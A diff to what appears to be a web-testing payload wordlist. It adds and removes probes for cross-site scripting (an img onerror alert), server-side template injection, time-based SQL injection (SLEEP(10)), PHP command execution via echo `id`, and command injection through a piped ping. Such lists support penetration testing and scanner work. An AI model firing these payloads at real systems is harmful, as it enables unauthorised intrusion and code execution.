@@ -18,7 +18,6 @@
 "><img/src=ElectricYellow onerror=alert(1)>
 #{15668*2}
 ${15668*2}
-${{15668*2}}
 }}{{15668*2}}
 <%= 15668*2 %>
 ${{<%[%'"{{%\
@@ -39,6 +38,6 @@ SLEEP(10) /*’ or SLEEP(10) or’” or SLEEP(10) or “*/
 a'a\'b"c>?>%}}%%>c<[[?${{%}}ElectricYellow\
 http://
 {% debug %}
-{php}echo `id`;{/php}
+<?php echo `id`; ?>
 |ping -c 30 127.0.0.1
 ~'!@#$%^&?*:()[]|\-_+,./
